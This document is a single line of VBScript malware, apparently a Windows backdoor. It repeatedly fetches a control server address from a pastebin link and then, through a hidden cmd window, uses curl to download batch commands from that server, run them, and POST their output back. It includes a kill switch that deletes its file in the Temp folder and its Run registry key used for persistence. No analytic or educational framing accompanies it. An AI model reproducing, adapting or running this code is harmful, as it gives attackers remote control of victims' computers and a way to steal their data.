On Error Resume Next:Set oHTTP = CreateObject("MSXML2.XMLHTTP"):Set objShell = CreateObject("WScript.Shell"):Do While True:oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False:oHTTP.send:tunnel = oHTTP.responseText:If InStr(tunnel, "kill") > 0 Then:CreateObject("Scripting.FileSystemObject").DeleteFile("C:\Users\rober\AppData\Local\Temp\Start.vbs"), True:objShell.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Start":WScript.Quit:End If:sh = "@echo off&cd %userprofile%&cmd /V:ON /C ""SET ip=" & tunnel & "&&SET sid=""Authorization: ac3b22bb-4baa2f93-341bd899""&&SET protocol=https://&&curl -fs -k !protocol!!ip!/ac3b22bb -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1"" > NUL":objShell.Run "cmd /C " & sh, 0, True:WScript.Sleep 5000:Loop:On Error Goto 0
